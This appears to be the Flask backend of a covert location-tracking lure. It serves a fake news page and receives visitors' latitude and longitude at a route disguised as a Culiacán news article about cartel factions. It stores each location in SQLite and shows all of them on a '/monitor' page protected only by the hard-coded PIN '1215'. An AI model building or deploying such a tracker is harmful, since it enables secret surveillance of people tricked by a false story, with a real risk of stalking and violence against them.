from flask import Flask, render_template, request, redirect, url_for, jsonify
from config import *
import sqlite3, time

app = Flask(__name__)
DB_FILE = 'ubicaciones.db'

@app.route('/culiacanazonews/mayos-y-chapos-de-luto/GAMEOVER', methods=['POST'])
def rastrear():
    data = request.get_json()
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO ubicaciones (latitud, longitud, hora) VALUES (?, ?, ?)", 
              (data['lat'], data['lon'], time.strftime('%Y-%m-%d %H:%M:%S')))
    conn.commit()
    conn.close()
    return jsonify({"status": "ok"})

@app.route('/monitor', methods=['GET', 'POST'])
def monitor():
    if request.method == 'POST' and request.form.get("pin") == "1215":
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT * FROM ubicaciones ORDER BY id DESC")
        ubicaciones = c.fetchall()
        conn.close()
        return render_template("monitor.html", ubicaciones=ubicaciones)
    return render_template("login.html")

@app.route('/')
def index():
    return render_template('noticia.html')

if __name__ == "__main__":
    app.run(debug=True)